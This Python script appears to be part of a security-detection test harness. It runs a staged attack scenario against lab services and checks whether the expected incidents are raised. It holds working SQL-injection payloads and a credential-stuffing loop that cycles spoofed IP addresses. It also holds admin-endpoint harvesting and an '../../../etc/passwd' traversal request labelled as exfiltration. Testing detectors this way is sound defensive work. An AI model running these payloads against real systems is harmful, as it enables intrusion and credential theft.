"""
scenario_c.py — Attack Scenario C

Multi-Hop Lateral Movement across 4 Services

Service hop chain
-----------------
  web-app → api-server → auth-service → api-server (export)

Stages (one per service hop)
----------------------------
  1. web-app:      Initial foothold via SQL injection through the proxy.
  2. api-server:   Harvest admin config + user export endpoints.
  3. auth-service: Credential stuffing from multiple spoofed source IPs.
  4. api-server:   Final exfiltration hop — bulk data export + file read.

Expected kill-chain incidents
  - full_kill_chain
  - automated_attack_tool
  - distributed_credential_attack
  - data_exfiltration_risk

MITRE ATT&CK: T1190, T1021, T1078, T1110.004, T1530, T1570
"""

from __future__ import annotations

import argparse
import time
from datetime import datetime

from attacker.common import (
    API_URL, AUTH_URL, WEBAPP_URL, Fore, SPEED_MAP,
    DetectionResult, add_speed_arg, log, req, reset_state,
    verify_detections,
)
from attacker import traffic_generator

TAG = "Scenario-C"

EXPECTED_INCIDENTS = [
    "full_kill_chain",
    "automated_attack_tool",
    "distributed_credential_attack",
    "data_exfiltration_risk",
]

SPOOFED_IPS = [
    "10.0.0.50", "10.0.0.51", "10.0.0.52",
    "192.168.1.100", "192.168.1.101",
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' UNION SELECT username,password,3 FROM users --",
    "'; SELECT * FROM users WHERE role='admin' --",
]

STOLEN_CREDS = [
    ("admin",   "admin123"),
    ("user1",   "password123"),
    ("alice",   "alice2024"),
    ("bob",     "bobpass!"),
    ("charlie", "charlie99"),
    ("john",    "password123"),  # seeded valid → triggers suspicious_login
]

EXFIL_TARGETS = [
    "/api/admin/users/export",
    "/api/admin/config",
    "/api/files?name=../../../etc/passwd",
]


def _hop_1_webapp(d: float) -> dict:
    log(TAG, "Hop 1 [web-app] — Initial foothold via SQL injection", Fore.YELLOW)
    hits = 0
    # Send through web-app proxy if reachable, otherwise directly to api
    for payload in SQLI_PAYLOADS:
        for base in (WEBAPP_URL, API_URL):
            r = req(
                "GET",
                f"{base}/api/products/search",
                spoofed_ip=SPOOFED_IPS[0],
                params={"q": payload},
                timeout=3,
            )
            if r is not None:
                hits += 1
                log(TAG, f"  [{base}] SQLi [{r.status_code}]: {payload[:35]}", Fore.RED)
                break
        time.sleep(d)
    return {
        "name":    "web_app_foothold",
        "service": "web-app",
        "success": hits > 0,
        "detail":  f"{hits}/{len(SQLI_PAYLOADS)} payloads delivered",
    }


def _hop_2_api(d: float) -> dict:
    log(TAG, "Hop 2 [api-server] — Harvest admin credentials & config", Fore.YELLOW)
    hits = 0
    for ep in ("/api/admin/config", "/api/admin/users/export"):
        r = req("GET", f"{API_URL}{ep}", spoofed_ip=SPOOFED_IPS[1], timeout=3)
        if r is not None:
            hits += 1
            log(TAG, f"  Admin harvest [{r.status_code}]: {ep}", Fore.RED)
        time.sleep(d)
    return {
        "name":    "api_credential_harvest",
        "service": "api-server",
        "success": hits > 0,
        "detail":  f"Accessed {hits}/2 admin endpoints",
    }


def _hop_3_auth(d: float) -> dict:
    log(TAG, "Hop 3 [auth-service] — Credential stuffing from spoofed IPs", Fore.YELLOW)
    success = 0
    for i, (username, password) in enumerate(STOLEN_CREDS):
        ip = SPOOFED_IPS[i % len(SPOOFED_IPS)]
        r = req(
            "POST",
            f"{AUTH_URL}/auth/login",
            spoofed_ip=ip,
            json={"username": username, "password": password},
            timeout=3,
        )
        status = "?"
        if r is not None:
            try:
                status = r.json().get("status", "?")
            except Exception:
                pass
        color = Fore.RED if status == "success" else Fore.YELLOW
        log(TAG, f"  [{ip}] {username}:{password} → {status}", color)
        if status == "success":
            success += 1
        time.sleep(d)
    return {
        "name":    "auth_credential_stuffing",
        "service": "auth-service",
        "success": True,
        "detail":  f"{success}/{len(STOLEN_CREDS)} credentials accepted from {len(SPOOFED_IPS)} IPs",
    }


def _hop_4_data(d: float) -> dict:
    log(TAG, "Hop 4 [api-server→data] — Final exfiltration", Fore.RED)
    hits = 0
    for target in EXFIL_TARGETS:
        r = req("GET", f"{API_URL}{target}", spoofed_ip=SPOOFED_IPS[0], timeout=3)
        if r is not None:
            hits += 1
            log(TAG, f"  Exfil [{r.status_code}]: {target}", Fore.RED)
        time.sleep(d)
    return {
        "name":    "data_exfiltration",
        "service": "data-store",
        "success": hits > 0,
        "detail":  f"{hits}/{len(EXFIL_TARGETS)} exfil targets reached",
    }


def run(speed: str = "normal", noise: bool = False) -> dict:
    d = 0.5 * SPEED_MAP.get(speed, 1.0)
    result = DetectionResult(
        scenario="C — Multi-Hop Lateral Movement (4 services)",
        start_time=datetime.now().isoformat(),
    )

    log(TAG, "═" * 60, Fore.CYAN)
    log(TAG, "Scenario C: web-app → api-server → auth-service → data", Fore.CYAN)
    log(TAG, "═" * 60, Fore.CYAN)

    reset_state()
    time.sleep(2)

    def _execute() -> None:
        result.stages.append(_hop_1_webapp(d))
        time.sleep(d * 2)
        result.stages.append(_hop_2_api(d))
        time.sleep(d * 2)
        result.stages.append(_hop_3_auth(d))
        time.sleep(d * 2)
        result.stages.append(_hop_4_data(d))

    if noise:
        with traffic_generator.background(rate=3.0, verbose=True):
            _execute()
    else:
        _execute()

    verify_detections(result, EXPECTED_INCIDENTS, wait_seconds=8.0, tag=TAG)
    result.end_time = datetime.now().isoformat()
    return result.summary()


def main() -> None:
    parser = argparse.ArgumentParser(description="Scenario C: Multi-hop lateral movement")
    add_speed_arg(parser)
    args = parser.parse_args()
    summary = run(speed=args.speed, noise=args.noise)
    matched = len(summary.get("matched", []))
    expected = len(summary.get("expected", []))
    log(TAG, f"Result: {matched}/{expected} expected detections", Fore.MAGENTA)


if __name__ == "__main__":
    main()
